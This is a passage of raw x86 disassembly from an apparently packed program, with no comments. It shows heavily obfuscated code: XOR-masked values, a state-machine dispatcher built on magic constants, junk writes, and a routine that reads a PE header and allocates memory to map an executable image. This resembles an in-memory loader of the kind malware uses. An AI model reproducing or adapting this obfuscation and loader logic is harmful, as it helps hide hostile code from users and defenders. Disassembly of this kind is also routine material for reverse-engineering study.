  4286c3:	mov    ecx,DWORD PTR [ecx]
  4286c5:	xor    ecx,edi
  4286c7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4286ce:	xor    al,cl
  4286d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4286d3:	mov    ecx,DWORD PTR [ecx]
  4286d5:	xor    ecx,edi
  4286d7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4286de:	or     al,cl
  4286e0:	mov    ecx,DWORD PTR [ebp-0xc]
  4286e3:	mov    ecx,DWORD PTR [ecx]
  4286e5:	xor    ecx,edi
  4286e7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4286ee:	cmp    cl,al
  4286f0:	jne    0x4287ca
  4286f6:	mov    eax,DWORD PTR [ebp+0xc]
  4286f9:	mov    eax,DWORD PTR [eax]
  4286fb:	xor    eax,edi
  4286fd:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428704:	mov    ecx,DWORD PTR [ebp-0x10]
  428707:	mov    ecx,DWORD PTR [ecx]
  428709:	xor    ecx,edi
  42870b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428712:	xor    al,cl
  428714:	mov    ecx,DWORD PTR [ebp-0x14]
  428717:	mov    ecx,DWORD PTR [ecx]
  428719:	xor    ecx,edi
  42871b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428722:	or     al,cl
  428724:	mov    ecx,DWORD PTR [ebp-0x10]
  428727:	mov    ecx,DWORD PTR [ecx]
  428729:	xor    ecx,edi
  42872b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428732:	cmp    cl,al
  428734:	jne    0x4287ca
  42873a:	mov    eax,DWORD PTR [ebp-0x14]
  42873d:	mov    eax,DWORD PTR [eax]
  42873f:	xor    eax,edi
  428741:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428748:	mov    ecx,DWORD PTR [ebp+0xc]
  42874b:	mov    ecx,DWORD PTR [ecx]
  42874d:	xor    ecx,edi
  42874f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428756:	xor    al,cl
  428758:	mov    ecx,DWORD PTR [ebp-0xc]
  42875b:	mov    ecx,DWORD PTR [ecx]
  42875d:	xor    ecx,edi
  42875f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428766:	or     al,cl
  428768:	mov    ecx,DWORD PTR [ebp+0xc]
  42876b:	mov    ecx,DWORD PTR [ecx]
  42876d:	xor    ecx,edi
  42876f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428776:	cmp    cl,al
  428778:	jne    0x4287ca
  42877a:	mov    eax,DWORD PTR [ebp-0x14]
  42877d:	mov    eax,DWORD PTR [eax]
  42877f:	xor    eax,edi
  428781:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428788:	mov    ecx,DWORD PTR [ebp-0xc]
  42878b:	mov    ecx,DWORD PTR [ecx]
  42878d:	xor    ecx,edi
  42878f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428796:	xor    al,cl
  428798:	mov    ecx,DWORD PTR [ebp-0x10]
  42879b:	mov    ecx,DWORD PTR [ecx]
  42879d:	xor    ecx,edi
  42879f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4287a6:	or     al,cl
  4287a8:	mov    ecx,DWORD PTR [ebp-0x14]
  4287ab:	mov    ecx,DWORD PTR [ecx]
  4287ad:	xor    ecx,edi
  4287af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4287b6:	cmp    cl,al
  4287b8:	jne    0x4287ca
  4287ba:	lea    eax,[ebp-0x4c]
  4287bd:	push   eax
  4287be:	call   0x428285
  4287c3:	mov    ecx,DWORD PTR [ebp-0x44]
  4287c6:	cmp    eax,ecx
  4287c8:	je     0x4287d4
  4287ca:	mov    eax,DWORD PTR [ebp+0x8]
  4287cd:	xor    eax,edi
  4287cf:	add    eax,ebx
  4287d1:	mov    DWORD PTR [ebp+0x18],eax
  4287d4:	mov    eax,DWORD PTR [ebp-0x8]
  4287d7:	xor    eax,edi
  4287d9:	lea    eax,[eax+esi*1+0x3272f1]
  4287e0:	xor    eax,edi
  4287e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4287e5:	mov    edx,DWORD PTR [ebp+0x18]
  4287e8:	xor    ecx,edi
  4287ea:	add    ecx,ebx
  4287ec:	cmp    edx,ecx
  4287ee:	je     0x4285eb
  4287f4:	mov    eax,DWORD PTR [ebp+0x8]
  4287f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4287fa:	xor    eax,edi
  4287fc:	add    eax,ebx
  4287fe:	cmp    ecx,eax
  428800:	jne    0x428813
  428802:	mov    eax,DWORD PTR [ebp-0x8]
  428805:	mov    ecx,DWORD PTR [ebp+0x1c]
  428808:	xor    eax,edi
  42880a:	lea    eax,[eax+ecx*1+0x3272f1]
  428811:	jmp    0x42888a
  428813:	push   0x18
  428815:	push   DWORD PTR [ebp-0x4]
  428818:	lea    eax,[ebp-0x64]
  42881b:	push   eax
  42881c:	call   0x427b01
  428821:	mov    eax,DWORD PTR [ebp+0x8]
  428824:	mov    ecx,DWORD PTR [ebp-0x18]
  428827:	xor    eax,edi
  428829:	add    eax,ebx
  42882b:	cmp    eax,ecx
  42882d:	je     0x428842
  42882f:	mov    eax,DWORD PTR [ebp+0x8]
  428832:	xor    eax,edi
  428834:	add    eax,ebx
  428836:	push   eax
  428837:	push   0x18
  428839:	lea    eax,[ebp-0x64]
  42883c:	push   eax
  42883d:	call   0x4280e6
  428842:	mov    eax,DWORD PTR [ebp-0x4]
  428845:	add    eax,0x18
  428848:	mov    DWORD PTR [ebp+0x18],eax
  42884b:	push   DWORD PTR [ebp-0x50]
  42884e:	push   DWORD PTR [ebp+0x18]
  428851:	mov    eax,DWORD PTR [ebp-0x54]
  428854:	add    eax,DWORD PTR [ebp-0x20]
  428857:	push   eax
  428858:	call   0x427b01
  42885d:	mov    eax,DWORD PTR [ebp+0x8]
  428860:	mov    ecx,DWORD PTR [ebp-0x18]
  428863:	xor    eax,edi
  428865:	add    eax,ebx
  428867:	cmp    eax,ecx
  428869:	je     0x42887c
  42886b:	push   0x0
  42886d:	push   DWORD PTR [ebp-0x50]
  428870:	mov    eax,DWORD PTR [ebp-0x54]
  428873:	add    eax,DWORD PTR [ebp-0x20]
  428876:	push   eax
  428877:	call   0x4280e6
  42887c:	mov    eax,DWORD PTR [ebp-0x24]
  42887f:	mov    ecx,DWORD PTR [ebp-0x50]
  428882:	add    DWORD PTR [eax],ecx
  428884:	mov    eax,DWORD PTR [ebp-0x50]
  428887:	add    eax,DWORD PTR [ebp+0x1c]
  42888a:	mov    DWORD PTR [ebp+0x1c],eax
  42888d:	mov    eax,DWORD PTR [ebp-0x8]
  428890:	mov    ecx,DWORD PTR [ebp+0x1c]
  428893:	xor    eax,edi
  428895:	add    eax,ebx
  428897:	imul   eax,ecx
  42889a:	mov    ecx,DWORD PTR [ebp+0x8]
  42889d:	mov    edx,DWORD PTR [ebp-0x28]
  4288a0:	xor    ecx,edi
  4288a2:	lea    ecx,[ecx+edx*1+0x3272f1]
  4288a9:	cmp    eax,ecx
  4288ab:	jb     0x428509
  4288b1:	mov    esi,DWORD PTR [ebp+0x14]
  4288b4:	mov    eax,DWORD PTR [ebp-0x20]
  4288b7:	mov    DWORD PTR [esi],eax
  4288b9:	jmp    0x428900
  4288bb:	mov    ecx,DWORD PTR [ebp+0x8]
  4288be:	mov    edx,DWORD PTR [ebp+0xc]
  4288c1:	xor    ecx,edi
  4288c3:	xor    edx,edi
  4288c5:	add    ecx,ebx
  4288c7:	add    edx,ebx
  4288c9:	cmp    ecx,edx
  4288cb:	jne    0x4288df
  4288cd:	mov    eax,ds:0x7f642ddc
  4288d2:	imul   eax,eax,0x9f15fccf
  4288d8:	mov    ds:0x7f642ddc,eax
  4288dd:	jmp    0x428900
  4288df:	mov    ecx,DWORD PTR [ebp+0x8]
  4288e2:	xor    ecx,edi
  4288e4:	add    ecx,ebx
  4288e6:	cmp    eax,ecx
  4288e8:	je     0x4288f6
  4288ea:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  4288f4:	jmp    0x428900
  4288f6:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  428900:	pop    edi
  428901:	pop    esi
  428902:	pop    ebx
  428903:	leave  
  428904:	ret    0x18
  428907:	push   ebp
  428908:	mov    ebp,esp
  42890a:	and    esp,0xfffffff8
  42890d:	mov    eax,DWORD PTR [ebp+0x20]
  428910:	sub    esp,0x14
  428913:	push   ebx
  428914:	mov    ebx,DWORD PTR [ebp+0x14]
  428917:	push   esi
  428918:	push   edi
  428919:	cmp    eax,0xf89c85a5
  42891e:	jne    0x42892a
  428920:	push   0xf89c85ba
  428925:	jmp    0x428a5c
  42892a:	mov    eax,DWORD PTR [ebp+0x20]
  42892d:	cmp    eax,0xf89c85ba
  428932:	jne    0x42893e
  428934:	push   0xf89c85bb
  428939:	jmp    0x428a5c
  42893e:	mov    eax,DWORD PTR [ebp+0x20]
  428941:	cmp    eax,0xf89c85bb
  428946:	jne    0x428952
  428948:	push   0xf89c85b8
  42894d:	jmp    0x428a5c
  428952:	mov    eax,DWORD PTR [ebp+0x20]
  428955:	cmp    eax,0xf89c85b8
  42895a:	jne    0x428966
  42895c:	push   0xf89c85b9
  428961:	jmp    0x428a5c
  428966:	mov    ecx,DWORD PTR [ebp+0x20]
  428969:	mov    eax,0xf89c85bc
  42896e:	cmp    ecx,eax
  428970:	jne    0x428a2c
  428976:	mov    eax,DWORD PTR [ebp+0x10]
  428979:	mov    DWORD PTR [esp+0xc],eax
  42897d:	mov    eax,DWORD PTR [ebp+0x18]
  428980:	mov    DWORD PTR [esp+0x14],eax
  428984:	mov    eax,DWORD PTR [ebp+0xc]
  428987:	mov    DWORD PTR [esp+0x18],eax
  42898b:	mov    eax,DWORD PTR [ebp+0x8]
  42898e:	mov    DWORD PTR [esp+0x10],eax
  428992:	mov    eax,DWORD PTR [esp+0x10]
  428996:	mov    ecx,DWORD PTR [esp+0x14]
  42899a:	mov    edi,0x75108aa
  42899f:	xor    eax,edi
  4289a1:	mov    esi,0x3272f1
  4289a6:	add    eax,esi
  4289a8:	mov    DWORD PTR [ecx],eax
  4289aa:	mov    eax,DWORD PTR [esp+0xc]
  4289ae:	mov    eax,DWORD PTR [eax+0x194]
  4289b4:	mov    ecx,DWORD PTR [eax]
  4289b6:	mov    eax,DWORD PTR [esp+0xc]
  4289ba:	mov    eax,DWORD PTR [eax+0x194]
  4289c0:	mov    eax,DWORD PTR [eax]
  4289c2:	add    eax,DWORD PTR [ecx+0x3c]
  4289c5:	mov    ecx,DWORD PTR [esp+0xc]
  4289c9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4289cf:	mov    ecx,DWORD PTR [ecx+0x14]
  4289d2:	push   0x4
  4289d4:	push   0x3000
  4289d9:	push   DWORD PTR [eax+0x50]
  4289dc:	push   0x0
  4289de:	call   ecx
  4289e0:	mov    DWORD PTR [ebx],eax
  4289e2:	mov    eax,DWORD PTR [esp+0x10]
  4289e6:	push   DWORD PTR [esp+0xc]
  4289ea:	xor    eax,edi
  4289ec:	add    eax,esi
  4289ee:	mov    DWORD PTR [esp+0x20],eax
  4289f2:	lea    eax,[esp+0x20]
  4289f6:	push   eax
  4289f7:	push   ebx
  4289f8:	push   DWORD PTR [esp+0x20]
  4289fc:	push   DWORD PTR [esp+0x28]
  428a00:	push   DWORD PTR [esp+0x24]
  428a04:	call   0x4283c9
  428a09:	mov    eax,DWORD PTR [esp+0x10]
  428a0d:	mov    ecx,DWORD PTR [ebx]
  428a0f:	xor    eax,edi
  428a11:	add    eax,esi
  428a13:	cmp    ecx,eax
  428a15:	je     0x428a73
  428a17:	mov    eax,DWORD PTR [esp+0x18]
  428a1b:	mov    ecx,DWORD PTR [esp+0x14]
  428a1f:	xor    eax,edi
  428a21:	add    eax,esi
  428a23:	imul   eax,DWORD PTR [esp+0x1c]
  428a28:	mov    DWORD PTR [ecx],eax
  428a2a:	jmp    0x428a73
  428a2c:	mov    ecx,DWORD PTR [ebp+0x20]
  428a2f:	cmp    ecx,0xf89c85b9
  428a35:	jne    0x428a3e
  428a37:	push   0xf89c85be
  428a3c:	jmp    0x428a5c
  428a3e:	mov    ecx,DWORD PTR [ebp+0x20]
  428a41:	cmp    ecx,0xf89c85be
  428a47:	jne    0x428a50
  428a49:	push   0xf89c85bf
  428a4e:	jmp    0x428a5c
  428a50:	mov    ecx,DWORD PTR [ebp+0x20]
  428a53:	cmp    ecx,0xf89c85bf
  428a59:	jne    0x428a73
  428a5b:	push   eax
  428a5c:	push   DWORD PTR [ebp+0x1c]
  428a5f:	push   DWORD PTR [ebp+0x18]
  428a62:	push   ebx
  428a63:	push   DWORD PTR [ebp+0x10]
  428a66:	push   DWORD PTR [ebp+0xc]
  428a69:	push   DWORD PTR [ebp+0x8]
  428a6c:	call   0x428907
  428a71:	mov    DWORD PTR [ebx],eax
  428a73:	mov    eax,DWORD PTR [ebx]
  428a75:	pop    edi
  428a76:	pop    esi
  428a77:	pop    ebx
  428a78:	mov    esp,ebp
  428a7a:	pop    ebp
  428a7b:	ret    0x1c
  428a7e:	push   ebp
  428a7f:	mov    ebp,esp
  428a81:	sub    esp,0xc
  428a84:	mov    eax,0xf89c85a5
  428a89:	mov    DWORD PTR [ebp-0x8],eax
  428a8c:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  428a93:	mov    ecx,DWORD PTR [ebp-0x8]
  428a96:	xor    ecx,0x75108aa
  428a9c:	add    ecx,0x3272f1
  428aa2:	mov    DWORD PTR [ebp-0x4],ecx
  428aa5:	mov    ecx,DWORD PTR [ebp+0xc]
  428aa8:	push   eax
  428aa9:	mov    DWORD PTR [ebp+0xc],ecx
  428aac:	push   DWORD PTR [ebp+0xc]
  428aaf:	lea    eax,[ebp-0x4]
  428ab2:	push   DWORD PTR [ebp+0x8]
  428ab5:	push   eax
  428ab6:	push   DWORD PTR [ebp+0xc]
  428ab9:	push   DWORD PTR [ebp-0xc]
  428abc:	push   DWORD PTR [ebp-0x8]
  428abf:	call   0x428907
  428ac4:	mov    DWORD PTR [ebp-0x4],eax
  428ac7:	mov    eax,DWORD PTR [ebp-0x4]
  428aca:	leave  
  428acb:	ret    0x8
